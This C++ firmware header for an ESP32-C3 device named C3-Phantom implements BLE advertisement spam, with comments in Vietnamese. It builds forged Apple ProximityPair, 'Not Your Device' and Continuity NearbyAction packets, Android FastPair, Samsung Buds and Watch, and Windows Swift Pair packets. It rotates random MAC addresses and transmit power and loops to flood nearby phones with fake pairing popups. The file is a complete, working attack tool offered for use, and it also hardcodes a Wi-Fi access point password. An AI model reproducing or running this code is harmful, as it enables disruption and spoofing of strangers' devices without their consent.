#pragma once
/*
 * ================================================================
 *  bluetooth/spam.hpp  —  BLE Spam nâng cấp cho C3-Phantom
 * ================================================================
 *  Tính năng ported từ Bruce Firmware (EA7KDO / Doominator1 /
 *  MarlinSchuck / Ninja-jr):
 *    · Apple ProximityPair  (27 thiết bị + Ngẫu Nhiên)
 *    · Apple Not Your Device
 *    · Apple NearbyAction  (Continuity động — MarlinSchuck)
 *    · Android FastPair    (82 model ID mở rộng)
 *    · Samsung Galaxy Buds (payload 31-byte từ Bruce/Flipper Zero)
 *    · Samsung Galaxy Watch (48 model byte)
 *    · Windows Swift Pair  (6 preset + Ngẫu Nhiên)
 *    · BLE Beacon          (iBeacon-style, tên ngẫu nhiên)
 *    · Tất Cả              (Random All xen kẽ các loại trên)
 *
 *  Giữ nguyên stack Bluedroid (BLEDevice / BLEAdvertising) của
 *  C3-Phantom gốc — KHÔNG dùng NimBLE.
 * ================================================================
 */

#include <functional>
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_random.h"
#include "utils.hpp"          // BLE_Setup(), advertising*, MAX_TX_POWER
#include "../selection.hpp"   // SelectionMenu()
#include "../display_utils.h" // Display_PrintCentered()
#include "../global.hpp"      // display, buttons

// ================================================================
//  PRNG xorshift64* — MAC ngẫu nhiên siêu nhanh (từ Bruce)
// ================================================================
static uint64_t _xs64 = 0;

static void _xs64_seed() {
    uint64_t a = ((uint64_t)esp_random() << 32) | esp_random();
    _xs64 = (a == 0) ? 0x9E3779B97F4A7C15ULL : a;
}

static uint64_t _xs64_next() {
    if (_xs64 == 0) _xs64_seed();
    uint64_t x = _xs64;
    x ^= x >> 12; x ^= x << 25; x ^= x >> 27;
    _xs64 = x;
    return x * 0x2545F4914F6CDD1DULL;
}

static void _rand_mac_xs(esp_bd_addr_t mac) {
    uint64_t r1 = _xs64_next(), r2 = _xs64_next();
    mac[0] = ((uint8_t)r1)       | 0xC0; // random static address
    mac[1] = (uint8_t)(r1 >> 8);
    mac[2] = (uint8_t)(r1 >> 16);
    mac[3] = (uint8_t)(r1 >> 24);
    mac[4] = (uint8_t)r2;
    mac[5] = (uint8_t)(r2 >> 8);
}

// ================================================================
//  Apple ProximityPair — 27 thiết bị (Bruce / Flipper Zero)
// ================================================================
struct _AppleDev { const char* name; uint16_t id; };

static const _AppleDev APPLE_PROX[] = {
    {"AirPods Pro",         0x0E20}, {"AirPods Pro 2",       0x1420},
    {"AirPods Pro 2 USBC",  0x2420}, {"AirPods 4 ANC",       0x2820},
    {"AirPods 4",           0x2920}, {"AirPods Max USBC",    0x2B20},
    {"AirPods Max",         0x0A20}, {"AirPods",             0x0220},
    {"AirPods 2",           0x0F20}, {"AirPods 3",           0x1320},
    {"AirTag",              0x0055}, {"Hermes AirTag",       0x0030},
    {"Beats Solo 3",        0x0620}, {"Beats Flex",          0x1020},
    {"Beats Solo Pro",      0x0C20}, {"Beats Studio Buds",  0x1120},
    {"Beats X",             0x0520}, {"Beats Studio 3",     0x0920},
    {"Beats Studio Pro",    0x1720}, {"Beats Fit Pro",      0x1220},
    {"Beats StudioBuds+",   0x1620}, {"Beats Solo 4",       0x2520},
    {"Beats Solo Buds",     0x2620}, {"Powerbeats 3",       0x0320},
    {"Powerbeats Pro",      0x0B20}, {"Powerbeats Pro 2",   0x2C20},
    {"Powerbeats Fit",      0x2F20},
};
static const int APPLE_PROX_COUNT = 27;

// ================================================================
//  Apple Continuity — NearbyAction type codes (Bruce / MarlinSchuck)
// ================================================================
static const uint8_t CONT_ACTIONS[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19,
    0x1E, 0x09, 0x2F, 0x02, 0x0B, 0x01,
    0x06, 0x0D, 0x2B
};
static const int CONT_ACTIONS_CNT = 15;

// ================================================================
//  Android FastPair — model IDs mở rộng 82 model (Bruce)
// ================================================================
static const uint32_t FP_MODELS[] = {
    0x0001F0,0x000047,0x470000,0x00000A,0x0A0000,0x00000B,0x0B0000,0x00000D,
    0x000007,0x070000,0x000009,0x090000,0x000048,0x001000,0x00B727,0x01E5CE,
    0x0200F0,0x00F7D4,0xF00002,0xF00400,0x1E89A7,0x0577B1,0x05A9BC,0xCD8256,
    0x0000F0,0xF00000,0x821F66,0xF52494,0x718FA4,0x0002F0,0x92BBBD,0x000006,
    0x060000,0xD446A7,0x2D7A23,0x038B91,0x02F637,0x02D886,0xF00001,0xF00201,
    0xF00209,0xF00205,0xF00305,0xF00E97,0x04ACFC,0x04AA91,0x04AFB8,0x05A963,
    0x05AA91,0x05C452,0x05C95C,0x0602F0,0x0603F0,0x1E8B18,0x1E955B,0x06AE20,
    0x06C197,0x06C95C,0x06D8FC,0x0744B6,0x07A41C,0x07C95C,0x07F426,0x0102F0,
    0x054B2D,0x0660D7,0x0103F0,0x0903F0,0x9ADB11,0x8B66AB,0xD99CA1,0x77FF67,
    0xAA187F,0xDCE9EA,0x87B25F,0x1448C9,0x13B39D,0x7C6CDB,0x005EF9,0xE2106F,
    0xB37A62,0x92ADC9,
};
static const int FP_MODELS_CNT = 82;

// ================================================================
//  Samsung Galaxy Buds — 3-byte color codes (Bruce / Flipper Zero)
// ================================================================
static const uint32_t BUDS_MODELS[] = {
    0xEE7A0C,0x9D1700,0x39EA48,0xA7C62C,0x850116,0x3D8F41,
    0x3B6D02,0xAE063C,0xB8B905,0xEAAA17,0xD30704,0x9DB006,
    0x101F1A,0x859608,0x8E4503,0x2C6740,0x3F6718,0x42C519,
    0xAE073A,0x011716,0x123456,0x654321,0x789ABC,0xDEF123,
    0x456789,0xABC123,0x321654,0x987654,0x654987,0x321987,
};
static const int BUDS_MODELS_CNT = 30;

// ================================================================
//  Samsung Galaxy Watch — model bytes (Bruce / Flipper Zero)
// ================================================================
static const uint8_t WATCH_MODELS[] = {
    0x1A,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,
    0x0A,0x0B,0x0C,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
    0x18,0x1B,0x1C,0x1D,0x1E,0x20,0x21,0x22,0x23,0x24,
    0x25,0x26,0x27,0x28,0x29,0x2A,0x30,0x31,0x32,0x33,
    0x34,0x35,0x40,0x41,0x42,0x60,0x61,0x62,
};
static const int WATCH_MODELS_CNT = 48;

// ================================================================
//  Windows Swift Pair — preset names (Bruce)
// ================================================================
static const char* WIN_PRESETS[] = {
    "C3-Phantom",
    "Never Gonna Give You Up",
    "Bill Nye's iPhone",
    "Skibidi Toilet",
    "FBI Surveillance Van",
    "Free WiFi Here",
};
static const int WIN_PRESETS_CNT = 6;

// ================================================================
//  Hiển thị trạng thái spam trên SSD1306 128x64
// ================================================================
static void _spam_disp(const char* lbl, int cnt, int pps) {
    display.clearDisplay();
    // Header trắng
    display.fillRect(0, 0, 128, 11, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(20, 2);
    display.print("Spam Ket Noi");
    display.setTextColor(WHITE);
    display.drawFastHLine(0, 11, 128, WHITE);
    // Loại spam (cắt ngắn 21 ký tự)
    display.setCursor(0, 14);
    char lb[22]; strncpy(lb, lbl, 21); lb[21] = 0;
    display.print(lb);
    // Số gói và tốc độ
    display.setCursor(0, 25);
    display.print("Goi: "); display.print(cnt);
    if (pps > 0) {
        display.print(" (");
        display.print(pps);
        display.print("/s)");
    }
    // Footer
    display.drawFastHLine(0, 54, 128, WHITE);
    display.setCursor(14, 56);
    display.print("[CTR] De Dung");
    display.display();
}

// ================================================================
//  Biến đổi TX power ngẫu nhiên — chiến lược từ C3-Phantom gốc
// ================================================================
static void _vary_tx() {
    int r = random(100);
    esp_power_level_t p;
    if      (r < 70) p = MAX_TX_POWER;
    else if (r < 85) p = (esp_power_level_t)(MAX_TX_POWER - 1);
    else if (r < 95) p = (esp_power_level_t)(MAX_TX_POWER - 2);
    else if (r < 99) p = (esp_power_level_t)(MAX_TX_POWER - 3);
    else             p = (esp_power_level_t)(MAX_TX_POWER - 4);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, p);
}

// ================================================================
//  Gửi 1 advertisement với payload raw
// ================================================================
static void _send_adv(const uint8_t* data, size_t len) {
    if (!advertising || len == 0 || len > 31) return;

    esp_bd_addr_t mac;
    _rand_mac_xs(mac);

    BLEAdvertisementData adData;
    adData.addData(std::string((char*)data, len));

    int t = random(3);
    if      (t == 0) advertising->setAdvertisementType(ADV_TYPE_IND);
    else if (t == 1) advertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    else             advertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);

    advertising->setDeviceAddress(mac, BLE_ADDR_TYPE_RANDOM);
    advertising->setAdvertisementData(adData);
    advertising->setMinInterval(0x20);
    advertising->setMaxInterval(0x20);
    advertising->setMinPreferred(0x20);
    advertising->setMaxPreferred(0x20);
    advertising->start();
    delay(100);
    advertising->stop();
}

// ================================================================
//  Payload Builders
// ================================================================

/* Apple ProximityPair (Flipper Zero format)
   prefix 0x07 → Pairing popup
   prefix 0x01 → "Not Your Device"                               */
static void _bld_apple_prox(uint8_t prefix, uint16_t devId,
                             uint8_t* out, size_t& len) {
    uint8_t i = 0;
    out[i++] = 0x1E;             // AD length = 30
    out[i++] = 0xFF;             // Manufacturer Specific
    out[i++] = 0x4C; out[i++] = 0x00; // Apple company ID
    out[i++] = 0x07;             // Continuity type: ProximityPair
    out[i++] = 0x19;             // Continuity size: 25
    out[i++] = prefix;
    out[i++] = (uint8_t)(devId >> 8);
    out[i++] = (uint8_t)(devId & 0xFF);
    out[i++] = 0x55;             // Status
    esp_fill_random(&out[i], 3); i += 3;  // Battery (ngẫu nhiên)
    out[i++] = 0x00; out[i++] = 0x00;    // Color / Reserved
    esp_fill_random(&out[i], 16); i += 16; // Encrypted payload (ngẫu nhiên)
    len = i; // 31 bytes
}

/* Apple NearbyAction — Continuity động (MarlinSchuck port)
   Kích hoạt popup iOS đáng tin cậy hơn payload tĩnh            */
static void _bld_apple_action(uint8_t* out, size_t& len) {
    uint8_t action = CONT_ACTIONS[esp_random() % CONT_ACTIONS_CNT];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() & 1)) flags--;
    if (action == 0x09 && (esp_random() & 1)) flags = 0x40;
    uint8_t i = 0;
    out[i++] = 10;
    out[i++] = 0xFF;
    out[i++] = 0x4C; out[i++] = 0x00; // Apple
    out[i++] = 0x0F;                   // NearbyAction
    out[i++] = 5;
    out[i++] = flags;
    out[i++] = action;
    esp_fill_random(&out[i], 3); i += 3;
    len = i; // 11 bytes
}

/* Android FastPair — Google model (mở rộng 82 model từ Bruce)  */
static void _bld_android(uint8_t* out, size_t& len) {
    uint32_t m = FP_MODELS[random(FP_MODELS_CNT)];
    uint8_t i = 0;
    out[i++] = 3;
    out[i++] = 0x03; out[i++] = 0x2C; out[i++] = 0xFE; // UUID
    out[i++] = 6;
    out[i++] = 0x16; out[i++] = 0x2C; out[i++] = 0xFE; // Service Data
    out[i++] = (uint8_t)((m >> 16) & 0xFF);
    out[i++] = (uint8_t)((m >> 8)  & 0xFF);
    out[i++] = (uint8_t)(m         & 0xFF);
    out[i++] = 2;
    out[i++] = 0x0A;
    out[i++] = (uint8_t)(random(120) - 100); // TX power
    len = i; // 14 bytes
}

/* Samsung Galaxy Buds — 31-byte payload (Bruce / Flipper Zero) */
static void _bld_buds(uint8_t* out, size_t& len) {
    uint32_t m = BUDS_MODELS[random(BUDS_MODELS_CNT)];
    uint8_t i = 0;
    out[i++] = 27;   out[i++] = 0xFF;
    out[i++] = 0x75; out[i++] = 0x00;
    out[i++] = 0x42; out[i++] = 0x09;
    out[i++] = 0x81; out[i++] = 0x02;
    out[i++] = 0x14; out[i++] = 0x15;
    out[i++] = 0x03; out[i++] = 0x21;
    out[i++] = 0x01; out[i++] = 0x09;
    out[i++] = (uint8_t)((m >> 16) & 0xFF); // R
    out[i++] = (uint8_t)((m >> 8)  & 0xFF); // G
    out[i++] = 0x01;
    out[i++] = (uint8_t)(m         & 0xFF); // B
    out[i++] = 0x06; out[i++] = 0x3C;
    out[i++] = 0x94; out[i++] = 0x8E;
    out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0x00; out[i++] = 0x00;
    out[i++] = 0xC7; out[i++] = 0x00;
    // Stub trailing record (Flipper Zero compat)
    out[i++] = 0x10; out[i++] = 0xFF; out[i++] = 0x75;
    len = i; // 31 bytes — đầy, KHÔNG thêm Flags
}

/* Samsung Galaxy Watch — 15-byte payload                        */
static void _bld_watch(uint8_t* out, size_t& len) {
    uint8_t m = WATCH_MODELS[random(WATCH_MODELS_CNT)];
    out[0]  = 14;
    out[1]  = 0xFF; out[2]  = 0x75; out[3]  = 0x00;
    out[4]  = 0x01; out[5]  = 0x00; out[6]  = 0x02;
    out[7]  = 0x00; out[8]  = 0x01; out[9]  = 0x01;
    out[10] = 0xFF; out[11] = 0x00; out[12] = 0x00;
    out[13] = 0x43; out[14] = m;
    len = 15;
}

/* Windows Swift Pair — 7+name bytes (từ C3-Phantom + Bruce)    */
static void _bld_windows(uint8_t* out, size_t& len,
                         const char* fixedName = nullptr) {
    const char* n;
    if (fixedName && fixedName[0]) {
        n = fixedName;
    } else {
        n = WIN_PRESETS[random(WIN_PRESETS_CNT)];
    }
    uint8_t nl = (uint8_t)strlen(n);
    if (nl > 21) nl = 21; // giới hạn 28 byte tổng
    uint8_t i = 0;
    out[i++] = 6 + nl;
    out[i++] = 0xFF;
    out[i++] = 0x06; out[i++] = 0x00; // Microsoft company ID
    out[i++] = 0x03; out[i++] = 0x00;
    out[i++] = 0x80;
    memcpy(&out[i], n, nl); i += nl;
    len = i;
}

/* BLE Beacon — iBeacon-style, tên ngẫu nhiên (từ Bruce)        */
static void _bld_beacon(uint8_t* out, size_t& len,
                        const char* fixedName = nullptr) {
    char rname[17];
    const char* n;
    if (fixedName && fixedName[0]) {
        n = fixedName;
    } else {
        for (int k = 0; k < 16; k++)
            rname[k] = 0x21 + (uint8_t)(_xs64_next() % 94);
        rname[16] = 0;
        n = rname;
    }
    uint8_t nl = (uint8_t)strlen(n);
    if (nl > 18) nl = 18;
    uint8_t i = 0;
    // Flags
    out[i++] = 0x02; out[i++] = 0x01; out[i++] = 0x06;
    // UUID 16-bit
    out[i++] = 0x03; out[i++] = 0x03; out[i++] = 0x12; out[i++] = 0x18;
    // Appearance
    out[i++] = 0x03; out[i++] = 0x19; out[i++] = 0x80; out[i++] = 0x01;
    // Complete Local Name
    out[i++] = nl + 1; out[i++] = 0x09;
    memcpy(&out[i], n, nl); i += nl;
    len = i;
}

// ================================================================
//  Vòng lặp spam chính
//  builder: hàm điền buffer (uint8_t* buf, size_t& len)
// ================================================================
using _BldFn = std::function<void(uint8_t*, size_t&)>;

static void _spam_loop(const char* label, _BldFn builder) {
    // Lưu & tắt WiFi (BLE và WiFi dùng chung radio trên ESP32-C3)
    wifi_mode_t prev_mode = WIFI_MODE_NULL;
    bool had_ap = (WiFi.getMode() == WIFI_AP || WiFi.getMode() == WIFI_AP_STA);
    esp_err_t wifi_err = esp_wifi_get_mode(&prev_mode);
    if (wifi_err == ESP_OK) {
        esp_wifi_stop();
        WiFi.mode(WIFI_MODE_NULL);
        delay(200);
    }

    // Khởi tạo BLE
    BLE_Setup();
    _xs64_seed();

    int   count    = 0;
    int   pps      = 0;
    unsigned long last_disp    = 0;
    unsigned long pps_window   = millis();
    int           pps_cnt      = 0;

    // Loop cho đến khi nhấn CENTER
    while (!ReadButton(BUTTON_CENTER)) {
        uint8_t buf[31];
        size_t  len = 0;
        builder(buf, len);

        if (len > 0 && len <= 31) {
            _vary_tx();
            _send_adv(buf, len);
            count++;
            pps_cnt++;
        }

        // Tính pkt/s mỗi giây
        unsigned long now = millis();
        if (now - pps_window >= 1000) {
            pps = pps_cnt;
            pps_cnt = 0;
            pps_window = now;
        }

        // Cập nhật màn hình mỗi 200ms
        if (now - last_disp >= 200) {
            _spam_disp(label, count, pps);
            last_disp = now;
        }
    }

    // Dọn dẹp BLE
    advertising->stop();
    BLEDevice::deinit(true);
    delay(200);

    // Khôi phục WiFi
    if (wifi_err == ESP_OK) {
        if (had_ap) {
            WiFi.mode(WIFI_AP_STA);
            WiFi.softAP("Pocket Puter", "deveclipse");
        } else {
            WiFi.mode(prev_mode);
            if (prev_mode != WIFI_MODE_NULL) esp_wifi_start();
        }
        delay(200);
    }

    HaltTillRelease(BUTTON_CENTER);
    display.clearDisplay();
    display.display();
}

// ================================================================
//  Helper chọn thiết bị Apple (dùng cho Pairing & Not Your Device)
// ================================================================
static int _apple_pick() {
    // Tạo mảng String từ APPLE_PROX
    const int total = APPLE_PROX_COUNT + 1; // +1 "Ngau Nhien"
    String opts[28]; // 27 + 1
    for (int i = 0; i < APPLE_PROX_COUNT; i++)
        opts[i] = String(APPLE_PROX[i].name);
    opts[APPLE_PROX_COUNT] = "Ngau Nhien";

    String sel = SelectionMenu(opts, total);
    for (int i = 0; i < total; i++)
        if (sel == opts[i]) return i;
    return APPLE_PROX_COUNT; // mặc định: ngẫu nhiên
}

// ================================================================
//  PUBLIC FUNCTIONS
// ================================================================

/* Apple Pairing — popup ghép nối AirPods / Beats / AirTag      */
void BLE_Spam_ApplePairing() {
    int idx   = _apple_pick();
    bool rnd  = (idx >= APPLE_PROX_COUNT);
    uint16_t id = rnd ? 0 : APPLE_PROX[idx].id;
    const char* lbl = rnd ? "Apple Ngau Nhien" : APPLE_PROX[idx].name;

    _spam_loop(lbl, [id, rnd](uint8_t* buf, size_t& len) {
        uint16_t devId = rnd
            ? APPLE_PROX[random(APPLE_PROX_COUNT)].id
            : id;
        _bld_apple_prox(0x07, devId, buf, len);
    });
}

/* Apple Not Your Device — cảnh báo "Không phải thiết bị của bạn" */
void BLE_Spam_AppleNotYours() {
    int idx   = _apple_pick();
    bool rnd  = (idx >= APPLE_PROX_COUNT);
    uint16_t id = rnd ? 0 : APPLE_PROX[idx].id;
    const char* lbl = rnd ? "Not Yours Rnd" : APPLE_PROX[idx].name;

    _spam_loop(lbl, [id, rnd](uint8_t* buf, size_t& len) {
        uint16_t devId = rnd
            ? APPLE_PROX[random(APPLE_PROX_COUNT)].id
            : id;
        _bld_apple_prox(0x01, devId, buf, len);
    });
}

/* Apple Action — popup modal iOS (Continuity NearbyAction động) */
void BLE_Spam_AppleAction() {
    _spam_loop("Apple Action", [](uint8_t* buf, size_t& len) {
        _bld_apple_action(buf, len);
    });
}

/* Android FastPair — 82 model Google (mở rộng từ Bruce)        */
void BLE_Spam_Android() {
    _spam_loop("Android FastPair", [](uint8_t* buf, size_t& len) {
        _bld_android(buf, len);
    });
}

/* Samsung Galaxy Buds — popup ghép nối tai nghe Galaxy          */
void BLE_Spam_SamsungBuds() {
    _spam_loop("Samsung Buds", [](uint8_t* buf, size_t& len) {
        _bld_buds(buf, len);
    });
}

/* Samsung Galaxy Watch — popup ghép nối đồng hồ Galaxy         */
void BLE_Spam_SamsungWatch() {
    _spam_loop("Samsung Watch", [](uint8_t* buf, size_t& len) {
        _bld_watch(buf, len);
    });
}

/* Samsung — Chọn loại: Buds / Watch / Ngẫu Nhiên                */
void BLE_Spam_Samsung() {
    String opts[] = {"Galaxy Buds", "Galaxy Watch", "Ngau Nhien"};
    String sel = SelectionMenu(opts, 3);

    if (sel == "Galaxy Buds") {
        BLE_Spam_SamsungBuds();
    } else if (sel == "Galaxy Watch") {
        BLE_Spam_SamsungWatch();
    } else {
        _spam_loop("Samsung Ngau Nhien", [](uint8_t* buf, size_t& len) {
            if (random(2)) _bld_buds(buf, len);
            else           _bld_watch(buf, len);
        });
    }
}

/* Windows Swift Pair — chọn preset tên hoặc ngẫu nhiên         */
void BLE_Spam_Windows() {
    const int total = WIN_PRESETS_CNT + 1;
    String opts[7]; // 6 + "Ngau Nhien"
    for (int i = 0; i < WIN_PRESETS_CNT; i++)
        opts[i] = String(WIN_PRESETS[i]);
    opts[WIN_PRESETS_CNT] = "Ngau Nhien";

    String sel = SelectionMenu(opts, total);

    // Tìm preset được chọn
    static char winName[24];
    bool useFixed = false;
    for (int i = 0; i < WIN_PRESETS_CNT; i++) {
        if (sel == opts[i]) {
            strncpy(winName, WIN_PRESETS[i], 23);
            winName[23] = 0;
            useFixed = true;
            break;
        }
    }

    _spam_loop("Windows Swift Pair", [useFixed](uint8_t* buf, size_t& len) {
        _bld_windows(buf, len, useFixed ? winName : nullptr);
    });
}

/* BLE Beacon — iBeacon spam tên ngẫu nhiên                      */
void BLE_Spam_Beacon() {
    _spam_loop("BLE Beacon", [](uint8_t* buf, size_t& len) {
        _bld_beacon(buf, len, nullptr);
    });
}

/* Tất Cả — xen kẽ ngẫu nhiên tất cả loại                      */
void BLE_Spam_All() {
    _spam_loop("Tat Ca", [](uint8_t* buf, size_t& len) {
        switch (random(7)) {
            case 0: {
                uint16_t id = APPLE_PROX[random(APPLE_PROX_COUNT)].id;
                _bld_apple_prox(0x07, id, buf, len);
                break;
            }
            case 1: _bld_apple_action(buf, len); break;
            case 2: _bld_android(buf, len);      break;
            case 3: _bld_buds(buf, len);          break;
            case 4: _bld_watch(buf, len);         break;
            case 5: _bld_windows(buf, len, nullptr); break;
            case 6: _bld_beacon(buf, len, nullptr);  break;
            default: _bld_android(buf, len); break;
        }
    });
}

/* Backward compatibility — BLE_Spam() gốc → gọi Tất Cả        */
void BLE_Spam() {
    BLE_Spam_All();
}
